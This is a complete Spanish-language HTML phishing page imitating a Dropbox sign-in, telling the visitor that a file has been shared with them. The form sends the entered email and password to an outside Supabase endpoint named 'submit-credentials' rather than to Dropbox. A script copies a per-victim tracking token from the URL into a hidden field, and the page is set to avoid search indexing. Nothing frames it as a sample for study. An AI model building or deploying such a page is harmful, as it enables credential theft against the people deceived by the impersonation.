<!doctype html>
<html lang="es"><head><meta charset="utf-8">
<title>Dropbox - Iniciar sesión</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<style>
  *{box-sizing:border-box}
  body{margin:0;background:#f7f9fa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;color:#1e1919;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
  .box{background:#fff;width:100%;max-width:400px;padding:40px 36px;border-radius:10px;box-shadow:0 1px 6px rgba(0,0,0,0.08);border:1px solid #edf2f7}
  /* wordmark CSS — sin imagen externa (evita logo roto) */
  .brand{display:flex;align-items:center;gap:9px;margin-bottom:28px}
  .brand .glyph{width:0;height:0;border-left:11px solid transparent;border-right:11px solid transparent;border-bottom:16px solid #0061ff}
  .brand .name{font-size:24px;font-weight:700;color:#0061ff;letter-spacing:-0.01em}
  h1{font-weight:600;font-size:21px;line-height:1.3;margin:0 0 6px}
  .sub{font-size:14px;color:#637282;margin:0 0 24px;line-height:1.5}
  label{display:block;font-size:12px;font-weight:600;color:#637282;margin:0 0 6px}
  input{width:100%;padding:13px 14px;font-size:15px;border:1px solid #c7d0da;border-radius:7px;outline:none;font-family:inherit;margin-bottom:16px}
  input:focus{border-color:#0061ff;box-shadow:0 0 0 2px rgba(0,97,255,0.18)}
  button{display:block;width:100%;background:#0061ff;color:#fff;border:none;padding:14px;font-size:15px;font-weight:600;border-radius:7px;cursor:pointer;font-family:inherit}
  button:hover{background:#0051d6}
  .links{font-size:13px;color:#637282;margin-top:18px;text-align:center;line-height:1.7}
  .links a{color:#0061ff;text-decoration:none}
  .foot{margin-top:26px;padding-top:18px;border-top:1px solid #edf2f7;font-size:11px;color:#9aa6b2;text-align:center;line-height:1.6}
</style></head>
<body>
<div class="box">
  <div class="brand"><span class="glyph"></span><span class="name">Dropbox</span></div>
  <h1>Inicia sesión para ver el archivo</h1>
  <p class="sub">Un documento se ha compartido contigo. Inicia sesión para acceder.</p>
  <form action="https://amjshbgyuazrtxrokqwy.supabase.co/functions/v1/submit-credentials" method="POST">
    <input type="hidden" name="token" id="token-field">
    <label for="email">Correo electrónico</label>
    <input type="email" name="email" id="email" placeholder="tu@empresa.com" required autofocus autocomplete="off">
    <label for="password">Contraseña</label>
    <input type="password" name="password" id="password" placeholder="Contraseña" required autocomplete="off">
    <button type="submit">Iniciar sesión</button>
  </form>
  <p class="links"><a href="#">¿Olvidaste tu contraseña?</a></p>
  <p class="foot">Dropbox · Al iniciar sesión aceptas las Condiciones del servicio.</p>
</div>
<script>document.getElementById('token-field').value=new URLSearchParams(location.search).get('t')||'';</script>
</body></html>
